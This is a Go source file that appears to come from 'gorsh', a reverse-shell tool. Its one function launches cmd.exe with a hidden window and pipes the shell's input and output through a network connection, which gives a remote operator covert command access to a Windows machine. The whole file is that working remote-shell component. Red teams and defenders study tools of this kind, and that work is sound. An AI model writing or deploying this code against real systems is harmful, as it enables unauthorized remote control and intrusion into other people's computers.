package cmds

import (
	"os/exec"
	"syscall"

	"github.com/audibleblink/gorsh/internal/myconn"

	"github.com/abiosoft/ishell"
)

func Cli(c *ishell.Context) {
	var cmd *exec.Cmd

	cmd = exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = myconn.Conn
	cmd.Stderr = myconn.Conn
	cmd.Stdin = myconn.Conn
	cmd.Run()
}
